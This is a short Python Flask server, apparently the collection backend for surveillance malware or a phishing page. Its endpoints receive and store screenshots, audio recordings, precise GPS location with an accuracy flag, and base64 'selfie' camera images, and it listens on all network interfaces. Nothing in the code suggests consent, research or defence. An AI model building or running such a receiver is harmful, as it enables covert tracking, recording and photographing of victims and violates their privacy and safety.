from flask import Flask, request
import os
from datetime import datetime
import base64
app = Flask(__name__)
upload_folder = "screenshots"
os.makedirs(upload_folder, exist_ok=True)
os.makedirs("pictures", exist_ok=True)
os.makedirs("audio", exist_ok=True)
@app.route('/upload-picture', methods=["POST"])
def upload_picture():
    if "image" not in request.files:
        return "No Images", 400
    image = request.files["image"]
    filename = datetime.now().strftime("%Y%m%d_%H%M%S") + ".png"
    path = os.path.join(upload_folder, filename)
    image.save(path)
    return "OK", 200
@app.route("/upload-audio", methods=["POST"])
def upload_audio():
    if "audio" not in request.files:
        return "No audio", 400
    audio = request.files["audio"]
    filename = datetime.now().strftime("%Y%m%d_%H%M%S") + ".wav"
    path = os.path.join("audio", filename)
    audio.save(path)
    return "OK", 200
@app.route('/get-location', methods=["POST"])
def get_location():
    data = request.json
    if not data or "location" not in data:
        return "No location data", 400
    location = data["location"]
    is_accurate = "Accurate" if location.get("isStrict") else "Not Accurate"
    lat = location.get("lat", 0)
    lon = location.get("lon", 0)
    accuracy = location.get("accuracy", "unknown")
    with open("locations.log", 'a') as file:
        file.write(f"{is_accurate}, ({lat},{lon}), Accuracy: {accuracy}\n")
    return "OK", 200
@app.route('/get-selfi', methods=["POST"])
def get_selfi():
    data = request.json
    image_data = data.get("image") if data else None
    count = len(os.listdir("pictures"))
    if image_data:
        with open(os.path.join("pictures", f"image_{count:03d}.jpg"), "wb") as f:
            f.write(base64.b64decode(image_data))
        return "OK", 200
    return "failed", 400
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=2020)